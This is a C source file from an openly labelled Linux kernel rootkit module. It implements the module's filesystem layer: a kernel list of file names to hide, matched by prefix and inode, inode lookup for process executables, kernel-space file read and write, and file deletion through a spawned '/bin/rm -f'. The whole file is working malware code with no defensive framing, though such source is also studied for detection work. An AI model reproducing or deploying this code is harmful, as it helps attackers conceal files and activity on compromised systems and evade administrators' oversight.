/**
 * Linux Kernel version <= 5.5.0
 * - hash
 *
 *  ɯnɹpǝɹ rootkit
 */

#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
#include <linux/umh.h>
#else
#include <linux/kmod.h>
#endif
#include <linux/tcp.h>
#include <linux/pid_namespace.h>
#include <linux/namei.h>
#include "fs.h"
#include "lkm.h"

bool fs_kern_path(const char *name, struct path *path) {
    if (!name || !path)
        goto error;

#ifdef get_fs
    mm_segment_t security_old_fs;
    security_old_fs = get_fs();
    set_fs(KERNEL_DS);
#endif

    if (kern_path(name, LOOKUP_FOLLOW, path))
        goto error;

#ifdef get_fs
    set_fs(security_old_fs);
#endif
    return true;
error:
    return false;
}

/**
 * callee must put the reference back
 * with path_put after calling this function
 */
bool fs_file_stat(struct path *path, struct kstat *stat) {
#ifdef get_fs
    mm_segment_t security_old_fs;
#endif
    if (!path || !stat)
        goto error;

#ifdef get_fs
    security_old_fs = get_fs();
    set_fs(KERNEL_DS);
#endif

    if (vfs_getattr(path, stat, STATX_BASIC_STATS, AT_STATX_SYNC_AS_STAT))
        goto error;

#ifdef get_fs
    set_fs(security_old_fs);
#endif
    return true;
error:
    return false;
}

struct fs_file_node *fs_load_fnode(struct file *f) {
    struct inode *i;
    struct kstat stat = {0};
    const struct inode_operations *op;
    struct fs_file_node *fnode;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
    u32 req_mask = STATX_INO;
    unsigned int query_mask = AT_STATX_SYNC_AS_STAT;
#endif

    if(!f) {
        prerr("Error: Invalid argument\n");
        return NULL;
    }

#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
    i = f->f_dentry->d_inode;
#else
    i = f->f_inode;
#endif
    if(!i)
        return NULL;

    op = i->i_op;
    if(!op || !op->getattr)
        return NULL;

    fnode = kzalloc(sizeof(struct fs_file_node), GFP_KERNEL);
    if(!fnode)
        return NULL;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,12,0)
    op->getattr(task_active_pid_ns(current)->user_ns, &f->f_path, &stat, req_mask, query_mask);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
    op->getattr(&f->f_path, &stat, req_mask, query_mask);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4,10,0)
  op->getattr(task_active_pid_ns(current)->proc_mnt, f->f_path.dentry, &stat);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3,18,0)
    op->getattr(task_active_pid_ns(current)->proc_mnt, f->f_dentry, &stat);
#endif

    /**
     * Once you know the inode number it is very easy to get the
     * executable full path by relying to find command:
     *
     * # find /path/to/mountpoint -inum <inode number> 2>/dev/null
     */
    fnode->ino = stat.ino;
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
    fnode->filename = (const char *)f->f_dentry->d_name.name;
#else
    fnode->filename = (const char *)f->f_path.dentry->d_name.name;
#endif

    return fnode;
}

struct fs_file_node* fs_get_file_node(const struct task_struct *task) {
    struct file *f;

    if(!task)
        return NULL;

    /**
     * Not error, it is kernel task
     * and there is no file associated with it.
     */
    if(!task->mm)
        return NULL;

    /*
     * It's a regular task and there is
     * executable file.
     */
    f = task->mm->exe_file;
    if(!f)
        return NULL;

    return fs_load_fnode(f);
}

static LIST_HEAD(names_node);
struct hidden_names {
    u64 ino;
    char *name;
    struct list_head list;
    bool ro;
};

bool fs_search_name(const char *name, u64 ino) {
    struct hidden_names *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &names_node, list) {

        /** This will match any string starting with pattern */
        if (!strncmp(node->name, name, strlen(node->name))) {
            /** and this will filter by inode number, if set. */
            if (0 == node->ino || ino == node->ino)
                return true; /** found match */
        }
    }
    /** not found */
    return false;
}

void fs_list_names(void) {
    struct hidden_names *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &names_node, list) {
        prinfo("hidden: '%s'\n", node->name);
    }
}

static int _fs_add_name(const char *names[], bool ro, u64 ino) {
    const char **s;

    if (!names)
        goto err;

    for (s = names; *s != NULL; ++s) {
        size_t len = strlen(*s);
        if (!len)
            continue;

        if (!fs_search_name(*s, ino)) {
            struct hidden_names *hn = kcalloc(1, sizeof(struct hidden_names) , GFP_KERNEL);
            if (!hn)
                return -ENOMEM;

            hn->name = kcalloc(1, len+1, GFP_KERNEL);
            strncpy(hn->name, (const char*)*s, len);
            hn->ro = ro;
            hn->ino = ino;
            prinfo("addname '%s'\n", hn->name);
            list_add_tail(&hn->list, &names_node);
        }
    }
    return 0;
err:
    prerr("Invalid argument\n");
    return -EINVAL;
}

int fs_add_name_ro(const char *names[], u64 ino) {
    return _fs_add_name(names, true, ino);
}

int fs_add_name_rw(const char *names[], u64 ino) {
    return _fs_add_name(names, false, ino);
}

bool fs_del_name(const char *names[]) {
    int deleted = 0;

    if (names) {
        struct hidden_names *node, *node_safe;
        const char **s;
        for (s = names; *s != NULL; ++s) {
            list_for_each_entry_safe(node, node_safe, &names_node, list) {
                if (node->ro) continue;
                if (!strcmp(node->name, *s)) {
                    prinfo("delname '%s'\n", *s);
                    list_del(&node->list);
                    if (node->name)
                        kfree(node->name);
                    kfree(node);
                    node = NULL;
                    ++deleted;
                }
            }
        }
    }

    return (deleted ? true : false);
}

void fs_names_cleanup(void) {
    struct hidden_names *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &names_node, list) {
        list_del(&node->list);
        if (node->name)
            kfree(node->name);
        kfree(node);
        node = NULL;
    }
}

struct file *fs_kernel_open_file(const char *name) {
    struct file *filp;

    if (!name) {
        prerr("%s: invalid argument: %p\n", __FUNCTION__, name);
        return NULL;
    }

    /** I won't let it go. Thanks. (kernel joke) */
    filp = filp_open(name, O_CREAT|O_APPEND|O_RDWR|O_LARGEFILE, 0600);
    if (IS_ERR(filp)) {
        prerr("Failed to open file %s: (%ld)\n",
                name, PTR_ERR(filp));
        return NULL;
    }
    return filp;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
ssize_t fs_kernel_write_file(struct file *filp, const void *ptr, size_t len, loff_t *offset)
#else
ssize_t fs_kernel_write_file(struct file *filp, const char *ptr, size_t len, loff_t offset)
#endif
{
    if (!filp) {
        prerr("Failed to write file: Invalid argument\n");
        return -EINVAL;
    }

    return kernel_write(filp, ptr, len, offset);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
ssize_t fs_kernel_read_file(struct file *filp, void *ptr, size_t len, loff_t *offset)
#else
int fs_kernel_read_file(struct file *filp, loff_t offset, char *ptr, unsigned long len)
#endif
{
    if (!filp) {
        prerr("Failed to read file: Invalid argument\n");
        return -EINVAL;
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
    return kernel_read(filp, ptr, len, offset);
#else
    return kernel_read(filp, offset, ptr, len);
#endif
}

int fs_kernel_close_file(struct file *filp) {
    if (!filp)
        return -EINVAL;

    return filp_close(filp, NULL);
}

int fs_file_rm(char *name) {
    static char *rm[] = {"/bin/rm", "-f", NULL, NULL};
    int ret;

    if (!name)
        return -EINVAL;

    rm[2] = name;
    if (ret = kv_run_system_command(rm))
        prerr("Error removing %s\n", name);

    return ret;
}
